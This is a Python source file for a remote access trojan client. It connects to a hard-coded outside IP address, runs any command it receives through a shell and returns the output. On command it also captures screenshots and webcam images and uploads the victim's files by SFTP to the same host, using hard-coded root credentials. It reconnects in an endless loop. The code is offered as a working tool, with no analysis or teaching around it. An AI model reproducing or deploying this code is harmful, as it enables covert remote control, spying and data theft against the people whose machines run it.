import os
import socket
import subprocess
import time
import signal
import sys
import struct
import paramiko
import pyscreenshot as ImageGrab
import pygame
class Client(object):

    def __init__(self):
        # self.serverHost = ''
        self.serverHost = '139.59.47.161'
        self.serverPort = 9999
        self.socket = None

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        sys.exit(0)
        return

    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return

    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return

    def print_output(self, output_str):
        """ Prints command output """
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        print(output_str)
        return

    def screenshot(self,name):
        im = ImageGrab.grab()

        im.save(os.getcwd()+'/'+name+'.png')
        return
    def webshot(self,name):
        import pygame.camera
        pygame.camera.init()
        print(pygame.camera.list_cameras()[0])
        cam = pygame.camera.Camera(pygame.camera.list_cameras()[0])
        cam.start()
        img = cam.get_image()
        import pygame.image
        pygame.image.save(img, str(name)+'.bmp')
        pygame.camera.quit()
        return

    def sftp(self,local_path, name):
        try:
           transport = paramiko.Transport(('139.59.47.161',22))
           transport.connect(username='root',password='adminpass')
           sftp =paramiko.SFTPClient.from_transport(transport)
           sftp.put(local_path, '/root/'+name)
           sftp.close()
           return "Done"
        except Exception as e:
            return str(e)

    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        try:
            self.socket.recv(100)
        except Exception as e:
            print('Could not start communication with server: %s\n' %str(e))
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'':
                break

            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: %s\n" %str(e)
                else: 
                    output_str = ""
            elif data[:].decode("utf-8") == 'quit':
                self.socket.close()
                break


            elif data[:4].decode("utf-8") == 'grab':
                command = data[:].decode("utf-8")
                grab,name,path = command.split('*')
                self.sftp(path,name)
                output_str = "Done\n"
            elif data[:10].decode("utf-8") == 'screenshot':
                command = data[:].decode("utf-8")
                var,name = command.split('*')
                self.screenshot(name)
                output_str = "done\n"

            elif data[:7].decode("utf-8") == 'webshot':
                command = data[:].decode("utf-8")
                var, name = command.split('*')
                self.webshot(name)
                output_str = "done\n"

            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                    print(output_str)
                except Exception as e:
                    # TODO: Error description is lost
                    output_str = "Command execution unsuccessful: %s\n" %str(e)
            if output_str is not None:
                try:
                    self.print_output(output_str)
                except Exception as e:
                    print('Cannot send command output: %s' %str(e))
        self.socket.close()
        return


def main():
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)     
        else:
            break    
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in main: ' + str(e))
    client.socket.close()
    return


if __name__ == '__main__':
    while True:
        main()
